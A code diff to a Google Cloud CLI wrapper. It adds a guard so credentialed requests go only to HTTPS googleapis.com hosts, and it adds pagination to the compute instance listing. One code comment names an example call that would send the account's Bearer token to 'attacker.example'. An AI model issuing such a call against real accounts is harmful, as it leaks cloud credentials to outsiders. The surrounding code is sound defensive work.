@@ -115,8 +115,29 @@ async function getAccessToken() {
   }
 }
 
+/**
+ * Guard against leaking the account's cloud-platform Bearer token to arbitrary
+ * hosts (e.g. `gcloud api https://attacker.example/`). Every credentialed call
+ * funnels through gfetch, so validating here covers the raw `api` passthrough
+ * and every built-in command. Allow only HTTPS Google API hosts.
+ */
+function assertGoogleHost(url) {
+  let u;
+  try { u = new URL(url); }
+  catch { cli.die(`Invalid URL: ${url}`, { prefix: 'gcloud' }); }
+  const okHost = u.hostname === 'googleapis.com' || u.hostname.endsWith('.googleapis.com');
+  if (u.protocol !== 'https:' || !okHost) {
+    cli.die(
+      `Refusing to send Google credentials to ${u.protocol}//${u.hostname}. ` +
+      `Only HTTPS *.googleapis.com hosts are allowed.`,
+      { prefix: 'gcloud' },
+    );
+  }
+}
+
 /** Authenticated JSON fetch against any Google API host. Full URL in, parsed body out. */
 async function gfetch(url, opts = {}) {
+  assertGoogleHost(url);
   const token = await getAccessToken();
   const headers = {
     Authorization: `Bearer ${token}`,
@@ -308,13 +329,22 @@ async function cmdProjectsList(flags) {
 
 async function cmdComputeInstances(flags) {
   const project = await requireProject(flags);
-  // aggregatedList spans all zones in one call.
-  const data = await gfetch(`https://compute.googleapis.com/compute/v1/projects/${encodeURIComponent(project)}/aggregated/instances`);
+  // aggregatedList spans all zones, but large fleets are paginated: the
+  // response carries a nextPageToken and .items is a zone-keyed OBJECT (not an
+  // array), so gfetchAll can't be used directly — follow the tokens by hand.
+  const base = `https://compute.googleapis.com/compute/v1/projects/${encodeURIComponent(project)}/aggregated/instances`;
   const rows = [];
-  for (const [zoneKey, bucket] of Object.entries(data.items || {})) {
-    for (const inst of (bucket.instances || [])) {
-      rows.push({ ...inst, _zone: (inst.zone || zoneKey).split('/').pop() });
+  let pageToken = '';
+  for (let i = 0; i < 50; i++) {
+    const pageUrl = pageToken ? `${base}?pageToken=${encodeURIComponent(pageToken)}` : base;
+    const data = await gfetch(pageUrl);
+    for (const [zoneKey, bucket] of Object.entries(data.items || {})) {
+      for (const inst of (bucket.instances || [])) {
+        rows.push({ ...inst, _zone: (inst.zone || zoneKey).split('/').pop() });
+      }
     }
+    if (!data.nextPageToken) break;
+    pageToken = data.nextPageToken;
   }
   const zoneFilter = str(flags.zone);
   const filtered = zoneFilter ? rows.filter(r => r._zone === zoneFilter) : rows;
